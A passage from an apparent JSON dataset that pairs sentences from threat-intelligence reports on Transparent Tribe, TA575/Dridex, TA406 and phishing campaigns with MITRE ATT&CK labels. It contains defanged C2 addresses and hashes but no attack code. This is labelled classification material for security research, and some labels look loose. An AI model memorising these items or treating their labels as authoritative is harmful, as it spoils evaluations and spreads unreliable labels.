this explains [the attribution of this hash to PlugX](https://www.virustotal.com/gui/file/382b3d3bb1be4f14dbc1e82a34946a52795288867ed86c6c43e4f981729be4fc/detection) by some antivirus engines, although as it has been observed in the post, it is a somewhat smaller threat, which is not developed in Delphi as plugx and that keeps a greater resemblance to HttpBrowser in terms of capabilities.", "labels": ["S0013", "S0013", "S0070"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "However, HttpBrowser does not share code or style of command codes with this sample, so it is most likely a different tool for the first infection stage.", "labels": ["S0070"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "| 3493331e8f6151a37a48d11243e0fa32e756e8ca78a454912630865b48a43693 | TokyoX ciphered |", "labels": [], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "| 31.192.107[.]187:443 | C2 |", "labels": ["TA0011"], "document": "lab52_2022-01-12_tokyox-dll-side-loading-an"}, {"sentence": "Furthermore, some of the artifacts and infrastructure used to carry out the novel infection campaign are strongly related to the threat group Transparent Tribe.", "labels": ["G0134"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "This file may have been sent attached to an email and contains a PDF document and some artifacts in order to display a decoy PDF to the user and initiate the infection process in the background.", "labels": ["T1566"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "The PDF is named Vaccination06042021.pdf and its contents are related to COVID vaccination for employees over 45 years of age at the Central Administration of the Government of India.", "labels": ["T1566"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "Although this decoy PDF document is harmless, the IMG file contains some other artifacts that will carry out the infection.", "labels": ["T1204"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "Firstly, the IMG file contains a shortcut with the same name as the PDF document, which will be in charge of starting the infection by launching a Visual Basic script called doc.vbs.", "labels": ["T1059"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "The infection chain continues executing both the decoy PDF document and a Windows PE (ServiceHub.MsDetouredHost.exe \u2013 68d73d596a7103e517967f7f4e22cecb) which after being analyzed, we have been able to identify it as a Python/PeppyRAT.", "labels": ["S0643", "T1055"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "The main feature of this Windows executable is the ability to run embedded Python commands from itself.", "labels": ["T1059"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "For this, the threat firstly relaunches itself and then starts building a new IAT (*Import Address Table*) referencing a large number of Python functions contained in the Python27.dll library that will be executed later.", "labels": ["T1059"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "The crux of the matter is that by dropping all python compiled objects and dynamic-link libraries required into %TEMP% directory, it makes this python command execution technique possible through a Windows PE file.", "labels": ["T1059", "T1055"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "An example of python command execution though a Windows PE can be seen below:", "labels": ["T1059", "T1055"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "Once the threat gets its environment all set, it builds and loads into memory a Python script that will be in charge of obtaining the list of running processes and notifying the command-and-control server through an HTTP POST request.", "labels": ["T1059", "T1071"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "As a result, we have a python script composed by seven functions plus its main function.", "labels": ["T1059"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "This script will notify to the C2C the extracted computer info and also set persistence into the victim machine.", "labels": ["TA0011", "TA0003", "TA0011", "T1005"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "Most important python functions are the following:", "labels": ["T1059"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "**Description:** Collect computer data: Get list of running processes", "labels": ["T1057"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "**Description:** Collect computer data: Get OS version and machine name", "labels": ["T1005"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "**Description:** Set persistence mechanism through Windows startup folders in the current user context", "labels": ["T1547"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "**Description:** Send collected information to the command-and-control server", "labels": ["T1041"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "As for network communications, as seen in the synchronize python function, the threat sends the list of running processes obtained, the OS version and the username through an HTTP request.", "labels": ["T1071"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "This domain, where the C2C is hosted, resolves to an IP address that belongs to Digital Ocean VPS service.", "labels": ["TA0011"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "So, the threat actors make use of this infrastructure to take control of compromised computers and carry out actions from their C2C.", "labels": ["TA0011"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "Finally, as a persistence mechanism, *simplify* function drops a new Windows PE file into the current user startup folder: (%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\devenv.defender.scr).", "labels": ["TA0003", "T1055", "T1547", "T1547"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "This later artifact has been developed in .NET framework and its purpose is very simple: waiting to receive a new infection module from the C2C, which is a DLL file named mscontainer.dll:", "labels": ["TA0011", "T1105"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "So far, we analyzed a threat whose main capabilities are for initial access and recognition of the compromised computer as a common operational characteristic of the threat group, in order to detect if the malware was executed in a sandbox or others analysis environments.", "labels": ["TA0001", "T1497"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "Therefore, we could consider it as the first stage and wait for new artifacts from the command-and-control server.", "labels": ["T1105"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "The Windows DLL *mscontainer.dll* sent afterwards by the C2C seems to be the next stage of infection.", "labels": ["TA0011", "T1105"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "Remember that this artifact is expected by the last analyzed PE devenv.defender.scr which persists on the Windows startup folders.", "labels": ["T1547"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "The threat-analysis has allowed us to obtain 37 decrypted strings, the commands accepted by the C2C and its hosted domain and others related to their capabilities, etc.", "labels": ["TA0011"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "For the time being, no new infection scenarios and/or modules implemented by the C2C server have been obtained.", "labels": ["TA0011"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "On the whole, this infection campaign seems to be related to the threat group Transparent Tribe, trying to compromise Indian government once again.", "labels": ["G0134"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "This assumption is based on the fact that the PDF content targeted to the government of India and the TTPs employed during the infection process are common on this group.", "labels": ["T1566"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "Even though this threat group usually deploys CrimsonRAT as an initial access threat, this time they have deployed PeppyRAT.", "labels": ["S0115", "TA0001", "S0643"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "So, it could be considered a variation of the TTPs related to the APT group Transparent Tribe.", "labels": ["G0134"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder |", "labels": ["T1547"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "| T1566.001 | Phishing: Spearphishing Attachment |", "labels": ["T1566"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "| T1059.006 | Command and Scripting Interpreter: Python |", "labels": ["T1059"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "| T1057 | Process discovery |", "labels": ["T1057"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "| T1041 | Exfiltration Over C2 Channel |", "labels": ["T1041", "T1041"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "| T1568 | Dynamic Resolution |", "labels": ["T1568"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "| T1005 | Data from Local System |", "labels": ["T1005", "T1005"], "document": "lab52_2022-01-24_new-transparentribe-operation-targeting-india"}, {"sentence": "TA575 Uses \u2018Squid Game\u2019 Lures to Distribute Dridex malware", "labels": ["S0384", "T1566"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "Proofpoint identified the large cybercrime actor TA575 distributing Dridex malware using\u00a0[Squid Game](https://www.netflix.com/title/81040344)\u00a0lures.", "labels": ["S0384", "T1566"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "On October 27, 2021, Proofpoint observed thousands of emails targeting all industries primarily in the United States.", "labels": ["T1566"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "The emails tell the victim to fill out either an attached document to get early access to the new season of the show or a talent form to become part of the background casting.", "labels": ["T1566"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "The attachments are Excel documents with macros that, if enabled, will download the Dridex banking trojan affiliate id \u201c22203\u201d from Discord URLs.", "labels": ["S0384", "T1566", "T1105"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "Dridex is a prolific banking trojan distributed by multiple affiliates that can lead to data theft and installation of follow-on malware such as ransomware.", "labels": ["S0384", "T1486"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "*Figure 3: One of the several Excel attachment lures observed in this campaign*", "labels": ["T1566"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "TA575 is a Dridex affiliate tracked by Proofpoint since late 2020.", "labels": ["S0384"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "This group distributes malware via malicious URLs, Microsoft Office attachments, and password-protected files.", "labels": ["T1566"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "On average, TA575 sends thousands of emails per campaign impacting hundreds of organizations.", "labels": ["T1566"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "TA575 also uses the Discord content delivery network (CDN) to host and distribute Dridex.", "labels": ["S0384"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "TA575 themes generally include invoicing and payments, but occasionally include popular news, events, and cultural references.", "labels": [], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "TA575 is betting the invitation to be part of the upcoming season will entice more users to interact with the malicious Microsoft Excel file.", "labels": ["T1204"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "| 85d2fe6405aac0816f7286bc26174151ae69a08210aec78fea5628862489d8ac\u00a0 | Dridex\u00a0SHA256\u00a0 |", "labels": ["S0384"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "| 149[.]202[.]179[.]100:443\u00a0 | Dridex\u00a0C2\u00a0 |", "labels": ["S0384", "TA0011"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "| 66[.]147[.]235[.]11:6891\u00a0 | Dridex\u00a0C2\u00a0 |", "labels": ["S0384", "TA0011"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "| 81[.]0[.]236[.]89:13786\u00a0 | Dridex\u00a0C2\u00a0 |", "labels": ["S0384", "TA0011"], "document": "proofpoint_2021-10-28_ta575-uses-squid-game-lures"}, {"sentence": "Triple Threat: North Korea-Aligned TA406 Scams, Spies, and Steals", "labels": ["G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "[**![](/sites/default/files/pdficon.png)\u00a0Download full report (PDF)**](/us/resources/threat-reports/triple-threat-north-korea-aligned-ta406-scams-spies-and-steals \"Triple Threat: North Korea Aligned TA406 Scams, Spies, and Steals\")", "labels": ["G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "* Throughout 2021, the North Korea-aligned threat actor TA406 conducted frequent credential theft campaigns targeting research, education, government, media and other organizations.", "labels": ["G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "* Proofpoint considers TA406 to be one of several actors that make up the activity publicly tracked as Kimsuky, Thallium and Konni Group.", "labels": ["G0094", "G0094", "G0094", "G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "* TA406 doesn\u2019t usually employ [malware](https://www.proofpoint.com/us/threat-reference/malware) in campaigns.", "labels": ["G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "* TA406 engages in espionage, cyber crime and sextortion.", "labels": ["G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "Throughout 2021, Proofpoint has tracked ongoing credential theft campaigns from TA406, an actor associated with the Democratic People\u2019s Republic of Korea (DPRK).", "labels": ["G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "Our analysts have tracked TA406 campaigns targeting customers since 2018, but the threat actor\u2019s campaigns remained low in volume until the beginning of January 2021.", "labels": ["G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "In this report, we describe in detail many of the campaigns and behaviors associated with an actor operating on behalf of the North Korean government: TA406.", "labels": ["G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "We begin by explaining how TA406 is associated with Kimsuky, a threat actor name broadly tracked by the threat intelligence community.", "labels": ["G0094", "G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "We then elaborate on how Proofpoint tracks the activity of Kimsuky as three separate threat actors\u2014TA406, TA408 and TA427.", "labels": ["G0094", "G0094", "G0094", "G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "This report also examines campaign timing and targeting by TA406, and it provides a look into how TA406 conducts [phishing](https://www.proofpoint.com/us/threat-reference/phishing) campaigns, including the tools and services used.", "labels": ["G0094", "G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "TA406 employs both malware and credential harvesting in espionage and information-gathering campaigns.", "labels": ["G0094", "TA0006"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "This report details several examples of each, including different types of credential collection and two implants used by TA406 that haven\u2019t been discussed before in open-source reporting.", "labels": ["TA0006", "G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "And finally, like all other North Korean state-sponsored actors that Proofpoint tracks, we provide evidence that TA406 conducts financially motivated campaigns, including the targeting of cryptocurrency and sextortion.", "labels": ["G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "(/sites/default/files/figures/TA406-activity-diagram.png)", "labels": ["G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "*Figure 1. TA406 activity diagram**.*", "labels": ["G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "**To read more,\u00a0[download the full report](/us/resources/threat-reports/triple-threat-north-korea-aligned-ta406-scams-spies-and-steals \"Triple Threat: North Korea Aligned TA406 Scams, Spies, and Steals\")[.](https://www.proofpoint.com/us/resources/threat-reports/triple-threat-north-korea-aligned-ta406-scams-spies-and-steals)**", "labels": ["G0094"], "document": "proofpoint_2021-11-18_triple-threat-north-korea-aligned"}, {"sentence": "High Volume German Phishing Campaign Aims to Steal Banking Credentials", "labels": ["T1566"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "Proofpoint researchers identified an increase in credential phishing campaigns attempting to steal German banking credentials.", "labels": ["T1566", "TA0006"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "Since the end of August 2021, Proofpoint researchers observed multiple high-volume campaigns leveraging customized, actor-owned landing pages spoofing major German banks, notably Volksbank and Sparkasse.", "labels": ["T1056"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "Each campaign included tens of thousands of messages impacting hundreds of organizations.", "labels": ["T1566"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "The phishing emails purport to be account administration information and contain links or QR codes that direct the victim to a geo-fenced credential harvesting page.", "labels": ["TA0006", "T1566", "T1056"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "*Figure 1: Email samples containing QR code (left) and link to spoofed website (right).*", "labels": ["T1566"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "The threat actor has used multiple URL redirection techniques to deliver the malicious links.", "labels": ["T1566"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "In several observed campaigns, the threat actor leveraged compromised Wordpress websites to redirect users to the phishing landing pages.", "labels": ["T1566"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "Abusing Wordpress plugins and websites running Wordpress software is a [common technique](https://portswigger.net/daily-swig/url-redirect-malware-infects-thousands-of-wordpress-sites) used by threat actors to distribute malicious links for phishing and malware attacks.", "labels": ["T1566"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "Additionally, researchers observed both Feedproxy URLs and QR codes used to redirect to the phishing pages.", "labels": ["T1566"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "The threat actor leverages geo-fencing techniques to ensure only users in Germany are redirected to the phishing page.", "labels": ["T1566"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "Proofpoint assesses with high confidence the threat actors are conducting IP geolocation checks to identify a target\u2019s location.", "labels": ["T1614"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "The user is encouraged to choose their Branch location and click \u201cLogin\u201d to be directed to the credential capture page, spoofing the legitimate banking site.", "labels": ["T1056"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "For example, the Sparkasse credential phishing URLs often start with \u201cspk-\u201d while Volksbank clones begin with \u201cvr-\u201d.", "labels": ["T1566"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "The actor/s is/are consistently registering new domains in the identified URL structure and the campaigns are ongoing.", "labels": ["T1583"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "Cybercriminal threat actors associated with banking credential theft and fraudulent financial activity tend to be opportunistic and target large numbers of victims.", "labels": ["TA0006"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "This is typically referred to as \u201cspray and pray\u201d activity, sending mass email campaigns in the hopes some of the targeted individuals fall for their scams.", "labels": ["T1566"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "* At the same time, assume that users will eventually click some threats.", "labels": ["T1204"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "Find a solution that spots and blocks inbound email threats targeting employees before they reach the inbox.", "labels": ["T1566"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "Your solution should analyze both external and internal email\u2014attackers may use compromised accounts to trick users within the same organization.", "labels": ["T1586"], "document": "proofpoint_2021-11-30_high-volume-german-phishing-campaign"}, {"sentence": "University Targeted Credential Phishing Campaigns Use COVID-19, Omicron Themes", "labels": ["T1566"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "Proofpoint researchers have identified an increase in email threats targeting mostly North American universities attempting to steal university login credentials.", "labels": ["T1566", "TA0006"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "Proofpoint observed COVID-19 themes impacting education institutions throughout the pandemic, but consistent, targeted credential theft campaigns using such lures targeting universities began in October 2021.", "labels": ["TA0006"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "Following the announcement of the new\u00a0[Omicron](https://www.who.int/news/item/26-11-2021-classification-of-omicron-(b.1.1.529)-sars-cov-2-variant-of-concern)\u00a0variant in late November, the threat actors began leveraging the new variant in credential theft campaigns.", "labels": ["TA0006"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "Threat actors continue to use COVID-19 theme lures in campaigns targeting multiple industries and geographic areas.", "labels": ["T1566"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "The threats specifically targeting universities is interesting due to the specificity in targeting and effort to mimic legitimate login portals.", "labels": ["T1566"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "We expect more threat actors will adopt COVID-19 themes given the introduction of the Omicron variant.", "labels": ["T1566"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "This assessment is based on previously\u00a0[published research](https://www.proofpoint.com/us/blog/threat-insight/delta-variant-spreads-covid-19-themes-make-resurgence-email-threats)\u00a0that identified COVID-19 themes making a resurgence in email campaigns\u00a0", "labels": ["T1566"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "The [phishing emails](/us/threat-reference/phishing \"Phishing\") contain attachments or URLs for pages intended to harvest credentials for university accounts.", "labels": ["T1566", "T1056"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "The landing pages typically imitate the university\u2019s official login portal, although some campaigns feature generic Office 365 login portals.", "labels": ["T1056", "T1056"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "In some cases, such as the Omicron variant lures, victims are redirected to a legitimate university communication after credentials are harvested.", "labels": ["TA0006"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "Proofpoint observed this threat actor pivot from Delta variant themed email lures to Omicron themes following the announcement of the new variant.", "labels": ["T1566"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "Emails with URLs use subjects such as:", "labels": ["T1566"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "With a link to a spoofed landing page such as:", "labels": ["T1566"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "Messages distributing attachments included subject lines such as \u201cCovid Test\u201d.", "labels": ["T1566"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "![HTM attachment ](/sites/default/files/inline-images/Screen%20Shot%202021-12-02%20at%2012.42.30%20PM.png)", "labels": ["T1566"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "*Figure 2: HTM attachment leading to a credential capture webpage.*", "labels": ["T1566", "T1056"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "*Figure 3: Credential theft webpage spoofing Vanderbilt University.*", "labels": ["T1056"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "In addition to multiple delivery methods \u2013 Proofpoint has observed both URL and attachments in campaigns \u2013 activity clusters use different sender and hosting methods to distribute credential theft campaigns.", "labels": ["T1566", "T1566"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "In the Omicron variant campaign, threat actors leverage actor-controlled infrastructure to host credential theft webpages using similar domain naming patterns.", "labels": ["T1583"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "Attachment-based campaigns have leveraged legitimate but compromised WordPress websites to host credential capture webpages, including:", "labels": ["T1566", "T1584", "T1056"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "In some campaigns, threat actors attempted to steal [multifactor authentication (MFA)](/us/threat-reference/multifactor-authentication \"Multifactor Authentication\") credentials, spoofing MFA providers such as Duo. Stealing MFA tokens enables the attacker to bypass the second layer of security designed to keep out threat actors who already know a victim\u2019s username and password.", "labels": ["T1111"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "While many messages are sent via spoofed senders, Proofpoint has observed threat actors leveraging legitimate, compromised university accounts to send COVID-19 themed threats.", "labels": ["T1586"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "It is likely the threat actors are stealing credentials from universities and using compromised mailboxes to send the same threats to other universities.", "labels": ["T1586"], "document": "proofpoint_2021-12-07_university-targeted-credential-phishing-campaigns"}, {"sentence": "That Holiday Feelin\u2019: TA575 Brings the Warm and Fuzzies with Year-end, Festive Lures", "labels": [], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "The threat actor tracked by Proofpoint as TA575 has kicked off the festive season with holiday-themed lures and is getting a head start on tax season in their latest high-volume campaigns.", "labels": [], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "The ultimate intent of the campaigns is to lure potential victims into downloading the Dridex banking trojan.", "labels": ["S0384"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "Dridex, which is a prolific piece of malware distributed by multiple affiliates, can lead to theft of personally identifiable information and installation of secondary payloads such as [ransomware](/us/threat-reference/ransomware \"Ransomware\").", "labels": ["S0384", "T1486", "T1486"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "The campaigns have impacted numerous industries, such as education, manufacturing, local government, insurance, and finance in the United States\u2014a typical geographic focus of TA575.", "labels": [], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "TA575 began this year's spate of holiday campaigns on November 24, 2021.", "labels": [], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "The emails delivered malicious Microsoft Excel file attachments that, if opened, used XL4 macros to download and execute Dridex affiliate id \"22201\" from a URL.", "labels": ["T1566", "T1059", "S0384", "T1204", "T1105"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "A November 29, 2021 campaign shifted to pulling Dridex affiliate id \"22202\" from Discord URLs. TA575 has used the Discord content delivery network (CDN) to host and distribute the banking trojan in other\u00a0[campaigns](https://www.proofpoint.com/us/blog/threat-insight/ta575-uses-squid-game-lures-distribute-dridex-malware)\u00a0this year.", "labels": ["S0384", "T1105", "T1102", "T1105"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "TA575's November 2021 campaigns veered away from the more wholesome and, at times, religious themes used by the group in 2020 to play on potential victims' desires for discounts and fears over being scammed this holiday season.", "labels": [], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "In December 2021, TA575 started to use both Microsoft Excel and Word attachments to deliver Dridex via Discord URLs, HTA files, and remote template.", "labels": ["T1566", "S0384", "T1059", "T1105", "T1059"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "The campaign used both the Dridex affiliate id \"22201\" and \"22204.", "labels": ["S0384"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "In some cases, the emails combined themes, using both the approaching holidays and the coming new year with US tax filing preparation and spoofing popular do-it-yourself tax services as seen in Figure 2.", "labels": ["T1566"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "*Figure 2. December 1, 2021 email spoofing a tax service.*", "labels": ["T1566"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "TA575, like other threat actors, is adept at using current events-based lures to take advantage of people being more interested in the topic than keeping their guard up from nefarious schemes.", "labels": [], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "During the holiday season, users become desensitized to receiving numerous advertising links for shopping deals and the like and may not think twice about opening a dangerous file or clicking a suspicious link.", "labels": ["T1566"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "| 149[.]56[.]106[.]83:443\u00a0 | Dridex\u00a0\u201c22201\u201d\u00a0&\u00a0\u201c22204\u201d\u00a0C2\u00a0 |", "labels": ["S0384", "TA0011"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "| 45[.]79[.]248[.]254:2222\u00a0 | Dridex\u00a0\u201c22201\u201d\u00a0&\u00a0\u201c22204\u201d\u00a0C2\u00a0 |", "labels": ["S0384", "TA0011"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "| 144[.]91[.]110[.]55:3978\u00a0 | Dridex\u00a0\u201c22201\u201d\u00a0&\u00a0\u201c22204\u201d\u00a0C2\u00a0 |", "labels": ["S0384", "TA0011"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "| 94[.]177[.]217[.]88:808\u00a0 | Dridex\u00a0\u201c22201\u201d\u00a0&\u00a0\u201c22204\u201d\u00a0C2\u00a0 |", "labels": ["S0384", "TA0011"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "| 185[.]4[.]135[.]165:5228\u00a0 | Dridex\u00a0\u201c22201\u201d\u00a0&\u00a0\u201c22204\u201d\u00a0C2\u00a0 |", "labels": ["S0384", "TA0011"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "| afceea7c2fc2d273a60c73d209f4a700b98aa2d8df9740fb0a08c3ae47890539\u00a0 | 